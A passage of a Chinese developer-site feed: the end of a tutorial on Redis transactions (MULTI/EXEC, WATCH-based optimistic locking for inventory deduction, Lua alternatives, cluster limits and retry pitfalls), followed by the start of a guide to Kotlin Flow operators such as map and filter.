<span class="hljs-keyword">import</span> time

client = redis.Redis(host=<span class="hljs-string">'localhost'</span>, port=<span class="hljs-number">6379</span>)
product_id = <span class="hljs-string">"1001"</span>
key = <span class="hljs-string">f"stock:product:<span class="hljs-subst">{product_id}</span>"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">deduct_stock</span>(<span class="hljs-params">quantity</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-comment"># 监控库存</span>
        client.watch(key)
        stock = <span class="hljs-built_in">int</span>(client.get(key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        <span class="hljs-keyword">if</span> stock &lt; quantity:
            client.unwatch()  <span class="hljs-comment"># 取消监控</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"库存不足"</span>
        
        <span class="hljs-comment"># 开启事务</span>
        pipe = client.pipeline()
        pipe.multi()
        pipe.decr(key, quantity)
        <span class="hljs-keyword">try</span>:
            result = pipe.execute()
            <span class="hljs-keyword">if</span> result:  <span class="hljs-comment"># 执行成功</span>
                <span class="hljs-keyword">return</span> <span class="hljs-string">"扣减成功"</span>
        <span class="hljs-keyword">except</span> redis.WatchError:
            time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># 简单退避重试</span>
            <span class="hljs-keyword">continue</span>

<span class="hljs-built_in">print</span>(deduct_stock(<span class="hljs-number">1</span>))
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>watch</code>：监控库存键。</li>
<li><code>pipeline().multi()</code>：开启事务。</li>
<li><code>execute()</code>：提交事务，捕获 <code>WatchError</code> 处理失败。</li>
</ul>
<h3 data-id="heading-32">5. 最佳实践</h3>
<h4 data-id="heading-33">如何选择监控的键</h4>
<ul>
<li><strong>原则</strong>：只监控对事务结果有直接影响的键，避免过度监控。</li>
<li><strong>示例</strong>：在库存扣减中，只 <code>WATCH</code> 库存键，而非用户数据。</li>
</ul>
<h4 data-id="heading-34">重试机制的设计</h4>
<ul>
<li><strong>指数退避</strong>：失败后等待时间逐渐增加（如 0.1s、0.2s、0.4s），避免瞬间重试风暴。</li>
<li><strong>固定间隔</strong>：简单场景下，固定 100ms 重试即可。</li>
<li><strong>上限控制</strong>：设置最大重试次数（如 5 次），超出后返回错误。</li>
</ul>
<p><strong>表格3：重试策略对比</strong></p>





























<table><thead><tr><th>策略</th><th>优点</th><th>缺点</th><th>适用场景</th></tr></thead><tbody><tr><td>指数退避</td><td>减少资源争抢</td><td>实现稍复杂</td><td>高并发秒杀</td></tr><tr><td>固定间隔</td><td>简单易用</td><td>可能引发重试高峰</td><td>低冲突场景</td></tr><tr><td>无重试</td><td>无额外开销</td><td>失败即放弃</td><td>非关键操作</td></tr></tbody></table>
<p>通过本章，你已经掌握了 <code>WATCH</code> 的乐观锁魔法，它让 Redis 事务在并发场景下如虎添翼。但事务还有更多玩法，比如与 Lua 脚本的结合，以及分布式环境下的挑战。下一章，我们将进入“高级应用与优化”的领域，探索更广阔的可能性！</p>
<hr/>
<h2 data-id="heading-35">五、事务机制的高级应用与优化（约800-1000字）</h2>
<p>经过前几章的探索，你已经熟悉了 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 的基本用法和实战技巧。但在真实项目中，事务机制往往需要与更复杂的场景结合，比如 Lua 脚本、性能优化，甚至分布式环境下的挑战。本章将带你从“熟练”迈向“精通”，解锁事务的高级玩法，同时分享一些优化经验和踩坑教训。让我们一起进入 Redis 事务的“进阶模式”吧！</p>
<h3 data-id="heading-36">1. 事务与Lua脚本的对比</h3>
<p>Redis 提供了两种实现原子操作的方式：事务和 Lua 脚本。它们各有千秋，选择哪一个取决于你的业务需求。</p>
<h4 data-id="heading-37">事务的轻量 vs Lua的灵活</h4>
<ul>
<li><strong>事务</strong>：通过 <code>MULTI</code> 和 <code>EXEC</code> 实现，简单直接，适合轻量级批量操作。它的优势在于易上手，客户端只需按顺序发送命令即可。</li>
<li><strong>Lua 脚本</strong>：通过 <code>EVAL</code> 执行自定义逻辑，支持条件判断和循环，功能更强大。它的优势在于灵活性，可以在服务端完成复杂计算。</li>
</ul>
<p><strong>表格4：事务 vs Lua 脚本对比</strong></p>



































<table><thead><tr><th>特性</th><th>事务 (MULTI/EXEC)</th><th>Lua 脚本</th></tr></thead><tbody><tr><td>实现方式</td><td>命令队列</td><td>脚本执行</td></tr><tr><td>原子性</td><td>支持</td><td>支持</td></tr><tr><td>灵活性</td><td>较低（固定命令）</td><td>高（支持逻辑）</td></tr><tr><td>性能开销</td><td>低</td><td>稍高（解析脚本）</td></tr><tr><td>调试难度</td><td>低</td><td>较高</td></tr></tbody></table>
<h4 data-id="heading-38">何时选择事务，何时选择Lua？</h4>
<ul>
<li><strong>用事务</strong>：当操作简单且固定时，比如批量更新几个键值对。</li>
<li><strong>用 Lua</strong>：当需要条件判断或动态逻辑时，比如“检查库存并扣减”的组合操作。</li>
</ul>
<p><strong>Lua 示例</strong>（替代事务的库存扣减）：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">local</span> stock = redis.call(<span class="hljs-string">'GET'</span>, KEYS[<span class="hljs-number">1</span>])
<span class="hljs-keyword">if</span> <span class="hljs-built_in">tonumber</span>(stock) &gt;= <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">1</span>]) <span class="hljs-keyword">then</span>
    redis.call(<span class="hljs-string">'DECRBY'</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>])
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>调用：<code>EVAL "script" 1 stock:product:1001 1</code></p>
<p><strong>对比结论</strong>：事务适合“简单粗暴”的场景，Lua 更适合“精细化”控制。</p>
<h3 data-id="heading-39">2. 性能优化技巧</h3>
<p>事务虽然高效，但用不好也可能成为性能瓶颈。以下是几条实战中总结的优化建议：</p>
<h4 data-id="heading-40">减少事务中的命令数量</h4>
<p>事务越长，执行时间越久，尤其在高并发下会拖慢整体响应。<strong>建议</strong>：单次事务控制在 10-20 个命令以内，超出时考虑拆分或用 Lua。</p>
<h4 data-id="heading-41">避免耗时操作</h4>
<p>某些命令（如 <code>KEYS</code> 或 <code>SMEMBERS</code>）会扫描大量数据，如果放在事务中，可能导致阻塞。<strong>解决办法</strong>：提前在事务外完成查询，只在事务中执行修改操作。</p>
<p><strong>错误示例</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">MULTI
KEYS user:*
SET user:1001 <span class="hljs-string">"active"</span>
EXEC
</code></pre>
<p><strong>优化后</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 提前查询</span>
KEYS user:*
<span class="hljs-comment"># 再执行事务</span>
MULTI
SET user:1001 <span class="hljs-string">"active"</span>
EXEC
</code></pre>
<h3 data-id="heading-42">3. 分布式场景下的扩展</h3>
<p>在 Redis Cluster 中，事务的使用会受到限制，因为集群将数据分片到不同槽（slot），而事务要求所有键在同一槽内。</p>
<h4 data-id="heading-43">Redis Cluster中的事务限制</h4>
<ul>
<li><strong>问题</strong>：如果事务涉及的键分布在多个槽，Redis 会报错 <code>CROSSSLOT</code>。</li>
<li><strong>解决办法</strong>：使用哈希标签（hash tag），如 <code>{user:1001}.name</code> 和 <code>{user:1001}.age</code>，确保键落在同一槽。</li>
</ul>
<h4 data-id="heading-44">结合业务拆分</h4>
<p>对于跨槽需求，可以将业务逻辑拆分到客户端，先分别操作不同槽的数据，再通过事务保证局部原子性。这种方式虽然复杂，但能绕过集群限制。</p>
<h3 data-id="heading-45">4. 踩坑案例</h3>
<h4 data-id="heading-46">案例1：事务中网络中断导致数据不一致</h4>
<p>在一次订单处理中，我们用事务更新订单状态和库存，但网络抖动导致 <code>EXEC</code> 未执行成功，客户端却认为已完成。结果库存扣了，订单状态没变。<br/>
<strong>解决方案</strong>：在事务后增加校验逻辑，确认结果一致性：</p>
<pre><code class="hljs language-python" lang="python">pipe = client.pipeline()
pipe.multi()
pipe.<span class="hljs-built_in">set</span>(<span class="hljs-string">'order:1001:status'</span>, <span class="hljs-string">'paid'</span>)
pipe.decr(<span class="hljs-string">'stock:1001'</span>)
result = pipe.execute()
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result <span class="hljs-keyword">or</span> result[<span class="hljs-number">0</span>] != <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"事务失败，需回滚或重试"</span>)
</code></pre>
<h4 data-id="heading-47">案例2：误用WATCH导致死循环</h4>
<p>在高并发场景下，<code>WATCH</code> 失败后未设置重试上限，导致客户端陷入死循环，CPU 占用飙升。<br/>
<strong>解决方案</strong>：加入重试次数限制：</p>
<pre><code class="hljs language-python" lang="python">max_retries = <span class="hljs-number">5</span>
<span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(max_retries):
    <span class="hljs-keyword">try</span>:
        client.watch(<span class="hljs-string">'stock:1001'</span>)
        stock = client.get(<span class="hljs-string">'stock:1001'</span>)
        pipe = client.pipeline()
        pipe.multi()
        pipe.decr(<span class="hljs-string">'stock:1001'</span>)
        pipe.execute()
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span> redis.WatchError:
        <span class="hljs-keyword">if</span> attempt == max_retries - <span class="hljs-number">1</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"重试次数超限"</span>)
        time.sleep(<span class="hljs-number">0.1</span>)
</code></pre>
<p>通过本章，你已经掌握了事务的高级用法和优化技巧，从 Lua 脚本的灵活性到分布式环境的应对策略，再到踩坑后的反思，Redis 事务的“全貌”逐渐清晰。接下来，我们将分享一些真实项目中的经验教训，告诉你如何把这些知识落地到实际开发中。准备好迎接实战的“干货”了吗？</p>
<hr/>
<h2 data-id="heading-48">六、项目经验分享：事务机制的最佳实践（约600-800字）</h2>
<p>理论和技巧固然重要，但真正让技术“落地”的，还是项目中的实战经验。在这一章，我将结合过去几年在实时订单处理系统中的实践，分享如何用 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 解决实际问题，同时剖析踩过的坑和总结的最佳实践。希望这些“干货”能为你的项目提供启发！</p>
<h3 data-id="heading-49">1. 实际项目中的应用</h3>
<h4 data-id="heading-50">项目背景：实时订单处理系统</h4>
<p>在一个电商平台中，我们需要处理用户的下单请求，确保订单状态更新和库存扣减同时完成，同时应对高峰期的并发压力。Redis 事务成为我们的首选工具，因为它既能保证原子性，又不会引入锁的额外开销。</p>
<h4 data-id="heading-51">如何使用 MULTI/EXEC 保证数据一致性</h4>
<p>我们设计了一个事务来同步更新订单和库存：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_order</span>(<span class="hljs-params">client, order_id, product_id, quantity</span>):
    pipe = client.pipeline()
    pipe.multi()
    pipe.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"order:<span class="hljs-subst">{order_id}</span>:status"</span>, <span class="hljs-string">"paid"</span>)  <span class="hljs-comment"># 更新订单状态</span>
    pipe.decrby(<span class="hljs-string">f"stock:<span class="hljs-subst">{product_id}</span>"</span>, quantity)  <span class="hljs-comment"># 扣减库存</span>
    result = pipe.execute()
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># 返回 [True, remaining_stock]</span>
</code></pre>
<p><strong>应用效果</strong>：在单节点 Redis 上，这个事务确保了两步操作的原子性，每天处理数万订单未出现不一致问题。</p>
<h4 data-id="heading-52">如何用 WATCH 实现并发控制</h4>
<p>在秒杀活动中，我们引入 <code>WATCH</code> 防止库存超卖：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy_in_seckill</span>(<span class="hljs-params">client, product_id, quantity</span>):
    key = <span class="hljs-string">f"stock:<span class="hljs-subst">{product_id}</span>"</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):  <span class="hljs-comment"># 最多重试3次</span>
        client.watch(key)
        stock = <span class="hljs-built_in">int</span>(client.get(key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        <span class="hljs-keyword">if</span> stock &lt; quantity:
            client.unwatch()
            <span class="hljs-keyword">return</span> <span class="hljs-string">"库存不足"</span>
        pipe = client.pipeline()
        pipe.multi()
        pipe.decrby(key, quantity)
        <span class="hljs-keyword">try</span>:
            result = pipe.execute()
            <span class="hljs-keyword">if</span> result:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"购买成功"</span>
        <span class="hljs-keyword">except</span> redis.WatchError:
            <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"购买失败，请重试"</span>
</code></pre>
<p><strong>应用效果</strong>：在 5000 QPS 的压力下，库存扣减准确无误，失败率控制在 2% 以内。</p>
<h3 data-id="heading-53">2. 踩坑与教训</h3>
<h4 data-id="heading-54">错误案例：未正确处理 EXEC 失败</h4>
<p>在早期版本中，我们假设 <code>EXEC</code> 返回非空就表示成功，但一次网络抖动导致结果丢失，库存扣了但订单未更新。<br/>
<strong>教训</strong>：不能仅依赖返回值的存在性，必须验证每个命令的执行结果。<br/>
<strong>解决方案</strong>：完善异常捕获：</p>
<pre><code class="hljs language-python" lang="python">result = pipe.execute()
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(result) != <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">0</span>] != <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"事务失败，需检查数据一致性"</span>)
</code></pre>
<h4 data-id="heading-55">错误案例：WATCH 重试未加限制</h4>
<p>在秒杀场景中，高并发下 <code>WATCH</code> 频繁失败，客户端未设置上限，导致请求堆积，Redis 负载激增。<br/>
<strong>教训</strong>：重试必须可控，避免无限循环。<br/>
<strong>解决方案</strong>：设置最大重试次数（如上例中的 3 次），并记录日志便于排查。</p>
<h3 data-id="heading-56">3. 经验总结</h3>
<h4 data-id="heading-57">事务设计的“三原则”</h4>
<p>基于多次实战，我总结了 Redis 事务设计的三个关键词：</p>
<ul>
<li><strong>轻量</strong>：事务尽量短小，避免塞入复杂逻辑。</li>
<li><strong>明确</strong>：明确每个命令的目的和预期结果，便于调试。</li>
<li><strong>可控</strong>：加入重试和异常处理，确保失败也能优雅退出。</li>
</ul>
<h4 data-id="heading-58">推荐工具与调试技巧</h4>
<ul>
<li><strong><code>redis-cli</code> 调试</strong>：用 <code>MONITOR</code> 命令观察事务执行过程，确认命令是否按预期入队和执行。</li>
<li><strong>日志记录</strong>：在客户端记录每次事务的输入和输出，便于事后分析。</li>
<li><strong>压力测试</strong>：用工具如 <code>redis-benchmark</code> 模拟高并发，验证事务性能。</li>
</ul>
<p><strong>示例：用 redis-cli 调试</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 监控实时命令</span>
redis-cli MONITOR
<span class="hljs-comment"># 客户端执行事务</span>
MULTI
SET key1 val1
EXEC
<span class="hljs-comment"># MONITOR 输出：</span>
<span class="hljs-string">" MULTI"</span>
<span class="hljs-string">" SET key1 val1"</span>
<span class="hljs-string">" EXEC"</span>
</code></pre>
<p>通过本章，你不仅看到了 Redis 事务在真实项目中的应用，还学到了如何避坑和优化设计。这些经验就像“前辈的叮嘱”，希望能帮你在自己的项目中少走弯路。接下来，我们将进入总结与展望部分，提炼核心要点并看看 Redis 事务的未来。最后一章，敬请期待！</p>
<hr/>
<h2 data-id="heading-59">七、总结与展望（约400-500字）</h2>
<p>经过前几章的旅程，我们从 Redis 事务的基础原理，到 <code>MULTI</code> 和 <code>EXEC</code> 的深入剖析，再到 <code>WATCH</code> 的乐观锁实战，最后结合项目经验探索了最佳实践。现在，是时候停下来回顾一下收获，并为你的下一步实践指明方向了。让我们一起总结要点，展望未来！</p>
<h3 data-id="heading-60">1. 核心要点回顾</h3>
<ul>
<li><strong><code>MULTI/EXEC</code> 的原子性与局限</strong>：<code>MULTI</code> 和 <code>EXEC</code> 提供了一个轻量级的原子操作框架，适合批量更新场景。但它不支持回滚，错误处理需要客户端提前设计。这种“简单粗暴”的风格，既是优势也是挑战。</li>
<li><strong><code>WATCH</code> 的乐观锁特性与实战价值</strong>：<code>WATCH</code> 为事务引入了并发控制能力，像一个敏锐的“哨兵”，在库存扣减、秒杀等场景中大显身手。它的轻量性和高效性，让高并发下的数据一致性不再是难题。</li>
<li><strong>实践中的取舍</strong>：事务虽好，但不能滥用。结合 Lua 脚本、优化命令数量、处理分布式限制，都是项目中需要权衡的关键。</li>
</ul>
<h3 data-id="heading-61">2. 对读者的建议</h3>
<p>想在项目中用好 Redis 事务？这里有几条实战建议：</p>
<ul>
<li><strong>从小处入手</strong>：先用 <code>MULTI/EXEC</code> 解决简单场景，比如缓存批量更新，熟悉后再尝试 <code>WATCH</code>。</li>
<li><strong>预判与验证</strong>：设计事务时，提前考虑失败场景，加入结果校验和重试逻辑。</li>
<li><strong>持续学习</strong>：关注 Redis 的新版本，比如 6.0+ 引入的改进（如更强的客户端支持），它们可能为事务带来新可能。</li>
</ul>
<p>具体实践时，不妨从一个小功能开始，比如用事务实现积分累加，然后逐步扩展到并发控制场景。边做边调，你会发现 Redis 事务的魅力。</p>
<h3 data-id="heading-62">3. 结语与展望</h3>
<p>Redis 事务机制虽然不算完美，但它用最小的代价实现了最大的价值，这正是 Redis “快而灵活”哲学的体现。未来，随着 Redis 在分布式系统中的应用加深，事务功能可能会进一步增强，比如更好的集群支持或更灵活的错误处理机制。作为开发者，保持对新技术的好奇心，持续探索，才能在变化中找到最佳解法。</p>
<p>最后，我想邀请你留言分享自己的实战经验。你在项目中如何用 Redis 事务解决难题？踩过哪些坑？欢迎在评论区交流，让我们一起成长！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[十分钟速览 Kotlin Flow 操作符]]></title>    <link>https://juejin.cn/post/7581870491762671668</link>    <guid>https://juejin.cn/post/7581870491762671668</guid>    <pubDate>2025-12-10T02:51:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491762671668" data-draft-id="7576532425761865743" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="十分钟速览 Kotlin Flow 操作符"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2025-12-10T02:51:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            十分钟速览 Kotlin Flow 操作符
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:51:59.000Z" title="Wed Dec 10 2025 02:51:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#5f6368;background-image:linear-gradient(90deg,rgba(240,191,213,.1) 3%,transparent 0),linear-gradient(1turn,rgba(240,191,213,.1) 3%,transparent 0);background-size:20px 20px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-left:50px;padding-bottom:5px;color:#5f6368}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:0;display:block;content:""}.markdown-body h1{font-size:32px;margin-bottom:5px}.markdown-body h1:before{top:0;content:"🦄";font-size:32px}.markdown-body h2{padding-bottom:24px;border-bottom:1px solid #ececec}.markdown-body h2:before{top:0;left:8px;content:"🐳";font-size:24px}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{top:-2px;left:8px;content:"🐄";font-size:20px}.markdown-body h4{font-size:16px}.markdown-body h4:before{top:-2px;left:8px;content:"🦥";font-size:18px}.markdown-body h5{font-size:14px}.markdown-body h5:before{top:-2px;left:9px;content:"🦩";font-size:16px}.markdown-body h6{font-size:12px;margin-top:5px}.markdown-body h6:before{top:-1px;left:10px;content:"🐧";font-size:14px}.markdown-body p{line-height:1.9;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid rgba(253,121,168,.5);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#a6accd;background:#292d3e;border-radius:8px}.markdown-body a{text-decoration:none;color:#fd79a8;border-bottom:1px solid #fd79a8;padding:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(253,121,168,.1);color:#ee69a9}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body th{color:#fd79a8}.markdown-body th,.markdown-body tr:hover{background:rgba(253,121,168,.1)}.markdown-body td{min-width:120px}.markdown-body blockquote{position:relative;color:#666;padding:23px;margin:22px 0;border-left:4px solid #ee69a9;background-color:rgba(253,121,168,.1)}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;display:block;font-size:27px;color:#fd79a8;opacity:.8}.markdown-body blockquote:before{left:10px;top:0;content:"❝"}.markdown-body blockquote:after{right:10px;bottom:0;content:"❞"}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body strong{position:relative;color:#fd79a8}.markdown-body strong:before{content:"· "}.markdown-body strong:after{content:" ·"}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#fd79a8}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#ee69a9}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45ccff6af8264a94b405eb6256e92583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=A3luuQF1pk0FqsnwK7gsFyqQ%2BnY%3D" alt="0.png" loading="lazy"/></p>
<p>实时的用户输入、多个网络请求的响应，再加上数据库的频繁更新，很容易让你的代码变得混乱不堪。而这，正是 Kotlin <code>Flow</code> 要帮你解决的问题。</p>
<p>作为基于协程构建的响应式流 API，Kotlin <code>Flow</code> 让你可以用声明式的方式优雅地处理异步数据流。但要想真正发挥它的强大能力，关键在于熟练掌握各种操作符。</p>
<p>本指南就是为你量身打造的速查手册——聚焦最核心的操作符，清晰说明它们的适用场景和使用方法，助你高效驾驭 Kotlin <code>Flow</code>。</p>
<hr/>
<h2 data-id="heading-0">一对一转换</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa9d45c2173c472786e17da65c24b33e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=SVd%2BnDSbrk2I1VP5MasvDPlk9I0%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-1">map</h3>
<p>将 <code>Flow</code> 中发出的每个元素转换为新元素，实现一对一映射。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin">
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    flowOf(<span class="hljs-string">"Kotlin"</span>, <span class="hljs-string">"Flow"</span>)
        .map { <span class="hljs-string">"Length of '<span class="hljs-variable">$it</span>' is <span class="hljs-subst">${it.length}</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Length of 'Kotlin' is 6</span>
<span class="hljs-comment">// Length of 'Flow' is 4</span>
</code></pre>
<p>适用场景：需要将每个项转换为不同类型或格式，例如在 <code>ViewModel</code> 中将 <code>Date</code> 对象格式化为可显示的 <code>String</code>。</p>
<h3 data-id="heading-2">filter</h3>
<p>仅允许满足给定条件的元素通过。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.5</span>).asFlow()
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 2</span>
